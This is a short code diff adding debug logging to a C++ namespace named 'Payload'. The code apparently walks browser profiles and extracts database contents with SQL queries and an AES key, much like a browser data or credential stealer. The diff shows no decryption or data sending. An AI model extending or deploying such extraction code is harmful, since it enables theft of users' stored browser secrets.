@@ -600,18 +600,31 @@ namespace Payload
 
             std::vector<fs::path> profilePaths(uniqueProfilePaths.begin(), uniqueProfilePaths.end());
 
+            // log profilePaths
+            Log("Found profile paths:" + std::to_string(profilePaths.size()));
             for (const auto &profilePath : profilePaths)
             {
                 Log("[*] Processing profile: " + profilePath.filename().u8string());
                 for (const auto &dataCfg : Data::GetExtractionConfigs())
                 {
+                    Log("profilePath: " + profilePath.u8string());
                     ExtractDataFromProfile(profilePath, dataCfg, aesKey);
                 }
             }
         }
 
+        // Debug function to dump an ExtractionConfig fields to the log
+        void DumpExtractionConfig(const Data::ExtractionConfig &cfg)
+        {
+            Log("[CFG] dbRelativePath=" + cfg.dbRelativePath.u8string());
+            Log("[CFG] outputFileName=" + cfg.outputFileName);
+            Log("[CFG] sqlQuery=" + cfg.sqlQuery);
+        }
+
         void ExtractDataFromProfile(const fs::path &profilePath, const Data::ExtractionConfig &dataCfg, const std::vector<uint8_t> &aesKey)
         {
+            // Log the config for debugging
+            DumpExtractionConfig(dataCfg);
             fs::path dbPath = profilePath / dataCfg.dbRelativePath;
             if (!fs::exists(dbPath))
                 return;
